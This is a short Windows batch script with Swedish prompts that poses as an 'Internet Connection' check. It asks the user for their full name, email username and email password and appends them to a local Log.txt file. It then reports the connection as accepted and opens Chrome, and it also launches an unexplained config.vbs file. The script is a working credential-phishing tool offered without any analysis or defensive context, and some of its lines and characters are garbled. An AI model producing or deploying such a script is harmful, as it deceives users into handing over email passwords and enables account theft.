@echo off
color 0a
start config.vbs
C:\Downloads
mkdir Logs
title Internet Connection:
cls
echo Skriv in ditt Anv�ndarnamn och l�senord nedanf�r
cd "C:Logs"
set /p real=Namn och Efternamn:
set /p user=Email Anv�ndarnamn:
set /p pass=Email L�senord:
echo Username="%user%" Password="%pass%" Real Name="%real%">>Log.txt
echo Tack. Internet Anslutning Accepterad.
ping localhost -n 3 >nul
start chrome.exe
exit